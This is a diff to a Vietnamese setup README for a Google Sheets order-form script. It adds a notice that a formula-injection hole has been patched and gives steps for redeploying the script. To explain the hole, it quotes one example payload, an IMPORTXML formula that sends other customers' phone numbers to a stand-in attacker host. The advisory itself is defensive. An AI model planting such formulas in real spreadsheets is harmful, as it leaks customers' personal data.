@@ -125,6 +125,34 @@ Cột Trạng thái có sẵn ô chọn và tự đổi màu, tiện theo dõi t
 
 ---
 
+## ⚠️ Nếu bạn đã cài đặt từ trước — phải dán lại mã
+
+Bản `scripts/apps-script.gs` mới đã vá một lỗ bảo mật thật: trước đây nếu khách
+điền họ tên là một công thức, ví dụ
+
+```
+=IMPORTXML("https://trang-xau.com/?x="&C2&C3,"//a")
+```
+
+thì Google Sheets sẽ **tự chạy công thức đó** ngay khi bạn mở bảng tính, và gửi
+số điện thoại của những khách hàng khác sang máy chủ của kẻ tấn công.
+
+Bản mới chèn dấu nháy đơn phía trước các ô như vậy nên Sheets hiểu đó chỉ là chữ.
+Dấu nháy này không hiện ra khi xem nên bảng tính trông vẫn y như cũ.
+
+Cách cập nhật (mất khoảng 2 phút):
+
+1. Mở lại bảng tính → **Tiện ích mở rộng → Apps Script**
+2. Xoá sạch nội dung cũ, dán lại **toàn bộ** `scripts/apps-script.gs`
+3. Điền lại `SECRET` bằng đúng giá trị `GOOGLE_SHEET_SECRET` trong `.env.local`
+4. Bấm **Triển khai → Quản lý các lần triển khai** → biểu tượng bút chì →
+   Phiên bản chọn **Phiên bản mới** → **Triển khai**
+
+URL webhook **không đổi**, nên không phải sửa gì trong `.env.local`.
+Không cần chạy lại `thietLapBanDau()`.
+
+---
+
 ## Sau này muốn đổi email nhận thông báo
 
 Mở Apps Script, sửa dòng:
